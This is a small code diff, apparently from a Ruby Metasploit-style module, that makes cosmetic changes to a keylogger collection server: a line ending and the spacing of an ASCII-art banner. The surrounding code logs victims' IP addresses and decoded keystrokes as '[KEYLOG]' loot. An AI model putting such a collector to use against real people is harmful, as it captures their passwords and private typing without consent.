@@ -206,7 +206,7 @@ EOS
 			send_response(cli, @random_text, {'Content-Type'=> content_type})
 			log = request.uri.split("&")[1]
 			hex_to_s(log)
-			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\r\n"
+			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\n"
 			if log.length > 1
 				print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@ascii_log}")
 			end
@@ -248,8 +248,8 @@ EOS
 			 ---------------------------------
 			  \\   ,__,
 			   \\  (oo)____
-				  (__)	  )\\
-					 ||--|| *
+			      (__)    )\\
+			        ||--|| *
 			^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 			Started at #{current_time}
 			=====================================
